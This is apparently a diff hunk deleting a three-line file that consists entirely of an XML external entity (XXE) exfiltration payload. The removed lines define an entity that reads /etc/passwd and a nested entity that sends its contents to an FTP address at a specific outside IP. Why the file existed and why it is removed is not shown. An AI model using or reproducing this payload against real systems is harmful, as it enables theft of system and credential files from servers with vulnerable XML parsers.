@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://3.124.188.125/?%file;'>">
-%all;
